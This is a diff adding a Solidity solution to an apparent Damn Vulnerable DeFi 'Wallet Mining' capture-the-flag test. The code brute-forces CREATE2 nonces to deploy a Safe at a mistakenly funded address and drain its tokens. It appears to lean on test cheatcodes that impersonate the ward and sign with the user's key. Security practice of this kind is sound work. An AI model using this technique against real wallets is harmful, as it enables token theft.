@@ -34,8 +34,8 @@ contract WalletMiningChallenge is Test {
     uint256 userPrivateKey;
 
     address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
-    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
 
+    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
     DamnValuableToken token;
     AuthorizerUpgradeable authorizer;
     WalletDeployer walletDeployer;
@@ -157,7 +157,67 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        NoncePredict predictor = new NoncePredict(address(proxyFactory), USER_DEPOSIT_ADDRESS, address(singletonCopy));
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners,                    // _owners
+                1,                          // _threshold
+                address(0),                 // to
+                "",                          // data
+                address(0),                  // fallbackHandler
+                address(0),                  // paymentToken
+                0,                            // payment
+                payable(address(0))          // paymentReceiver
+            )
+        );
+        (bool found, uint256 nonce) = predictor.predict(bytes(initializer));
+        if(found) {
+            vm.startPrank(ward);
+            walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);
+            vm.stopPrank();
+        }
+        bytes memory data = abi.encodeWithSignature(
+            "transfer(address,uint256)", 
+            user, 
+            DEPOSIT_TOKEN_AMOUNT 
+        );
+        uint256 nonce2 = Safe(payable(USER_DEPOSIT_ADDRESS)).nonce();
+        bytes32 safeTxHash = Safe(payable(address(USER_DEPOSIT_ADDRESS))).getTransactionHash(
+            address(token),
+            0,
+            data,
+            Enum.Operation.Call,
+            1_000_000,
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            nonce2
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) =
+            vm.sign(userPrivateKey, safeTxHash);
+
+        bytes memory signatures = abi.encodePacked(r, s, v);
+        bytes memory execData = abi.encodeWithSelector(
+            Safe.execTransaction.selector,
+            address(token),
+            0,
+            data,
+            Enum.Operation.Call,
+            1_000_000,
+            0,
+            0, 
+            address(0),
+            payable(address(0)),
+            signatures
+        );
+        (bool succes, ) = USER_DEPOSIT_ADDRESS.call(execData);
+        require(succes, "execTransaction failed");
     }
 
     /**
@@ -188,5 +248,32 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract NoncePredict {
+    address proxyFactory;
+    address mistakenAddress;
+    address singletonCopy;
+
+    constructor(address _proxyFactory, address _mistakenAddress, address _singletonCopy) {
+        proxyFactory = _proxyFactory;
+        mistakenAddress = _mistakenAddress;
+        singletonCopy = _singletonCopy;
+    }
+
+    function predict(bytes memory wat) public view returns(bool, uint256) {
+        bytes memory initCode = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(singletonCopy)));
+
+        for(uint256 i = 0; i < 100_000; ++i) {
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(wat), i));
+            bytes32 hashh = keccak256(abi.encodePacked(bytes1(0xff), proxyFactory, salt, keccak256(initCode)));
+            address predicted = address(uint160(uint256(hashh)));
+            if(predicted == mistakenAddress) {
+                return (true, i);
+            }
+        }
+        return (false, 0);
+        
     }
 }
